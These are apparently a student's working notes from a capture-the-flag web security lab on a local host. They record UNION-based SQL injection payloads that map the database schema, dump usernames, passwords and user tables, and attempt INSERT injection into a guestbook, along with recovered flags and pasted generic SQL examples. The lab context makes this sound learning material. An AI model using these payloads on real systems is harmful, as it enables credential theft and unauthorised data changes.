http://192.168.1.16/?page=member
this page allows to search a member by it's id and shows it's last name and surname

assumption: the query is in the form of:
SELECT ?1, ?2 FROM ?3 WHERE ?4=ARG
with:
?1 and ?2 being the column names for first name and surname
?3 being a table where members are stored
?4 being the member id column name
ARG being the provided member id 

objective:
taking advantage of ARG to inject commands

the command takes 1 parameter and returns 2  fields (shows 3 on result page, 
	entry parameter is included)
-> UNION based attacks need to return 2 fields 
-> in result page the first field will be named as "First Name"
	and the second as "Surname"


################################################################################
1 UNION SELECT  first_name, last_name FROM users--
>> obtain list of all members
random poking around with usual field/table names
tried id, password, email fields, but column does not exist


poking around randomly is tedious and inneficient
################################################################################
1 UNION SELECT table_schema, table_name FROM information_schema.tables--
>> obtain table names and schema(see dump_01*)
(table_type and table_catalog do not give interesting info)
################################################################################
1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS--
>> obtain field names from every tables in the db (see dump_02*)
big dump, was unable to use WHERE clause to limit it due to escaping protections


With the database mapped out we can start looking for valuable data.

################################################################################
1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default--
>> returns id/username and id/password(see dump_03*)
since we have to return 2 fields for the union to work we use 2 union in the
	same request, obtaining the id is not really needed but db_default has
	only 3 column so might as well

################################################################################
9 UNION SELECT user_id, first_name FROM users 
	UNION SELECT user_id, last_name FROM users 
	UNION SELECT user_id, town FROM users 
	UNION SELECT user_id, country FROM users 
	UNION SELECT user_id, planet FROM users 
	UNION SELECT user_id, Commentaire FROM users 
	UNION SELECT user_id, countersign FROM users--
>> dumps all the users table data(see dump_04*)

	(flag)
	5ff9d0165b4f92b14994e5c685cdce28
	(md5 decode) -> FortyTwo
	(lowercase) -> fortytwo
	(sha256) -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5



################################################################################
9 UNION SELECT VARIABLE_NAME, VARIABLE_VALUE FROM information_schema.GLOBAL_VARIABLES--
>> global variables ? (see dump_05*)



!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!
TODO check for interesting stuff
!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!



################################################################################
9 UNION SELECT id_comment, comment FROM Member_guestbook.guestbook
	UNION SELECT id_comment, name FROM Member_guestbook.guestbook--
>> dump_06*

################################################################################
9 UNION SELECT id, url FROM Member_images.list_images
	UNION SELECT id, title FROM Member_images.list_images
	UNION SELECT id, comment FROM Member_images.list_images--
>> dump_07*

	(flag)
	1928e8083cf461a51303633093573c46
	(md5 decode)-> albatroz
	(lowercase)-> albatroz
	(sha256) -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

################################################################################
9 UNION SELECT id_vote, vote FROM Member_survey.vote_dbs
	UNION SELECT id_vote, nb_vote FROM Member_survey.vote_dbs
	UNION SELECT id_vote, subject FROM Member_survey.vote_dbs--
>> dump_08*













@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


    insert into Scholars (firstname, lastname, address, phone, email)
      values ('Henry', 'Higgins', '27A Wimpole Street', '3231212', null)
      returning lastname, fullname, id

    insert into Dumbbells (firstname, lastname, iq)
      select fname, lname, iq from Friends order by iq rows 1
      returning id, firstname, iq into :id, :fname, :iq;



SELECT id FROM image_instance WHERE name = 'bioboxes/velvet-then-quast'
UNION ALL
INSERT INTO image_instance (name, sha256, image_type_id)
SELECT
    'bioboxes/velvet-then-quast',
    'digest_4',
    (SELECT id FROM image_type WHERE name = 'short_read_preprocessing_reference_evaluation')
WHERE NOT EXISTS (SELECT id FROM image_instance WHERE name = 'bioboxes/velvet-then-quast')
RETURNING id



WITH
CTE
AS
(
    INSERT INTO image_instance (name, sha256, image_type_id)
    SELECT
        'bioboxes/velvet-then-quast',
        'digest_4',
        (SELECT id FROM image_type WHERE name = 'short_read_preprocessing_reference_evaluation')
    WHERE NOT EXISTS (SELECT id FROM image_instance WHERE name = 'bioboxes/velvet-then-quast')
    RETURNING id
)
SELECT id FROM image_instance WHERE name = 'bioboxes/velvet-then-quast'
UNION ALL
SELECT id FROM CTE
;






UNION INSERT RETURNING
################################################################################
9 UNION INSERT INTO Member_guestbook.guestbook (name, comment) VALUES ('kpz', 'yesyesyesyes') RETURNING name, comment--


9 UNION WITH CTE AS ( INSERT INTO Member_guestbook.guestbook (name, comment) VALUES ('kpz', 'yesyesyesyes') RETURNING name, comment) UNION SELECT id_comment, name FROM Member_guestbook.guestbook--










//next
check tables (from dump02)
	GLOBAL_VARIABLES fields VARIABLE_NAME, VARIABLE_VALUE
	USER_STATISTICS
if able to inject data, try PARAMETERS table (maybe avoid escaping problems by using @)
		try adding a user ?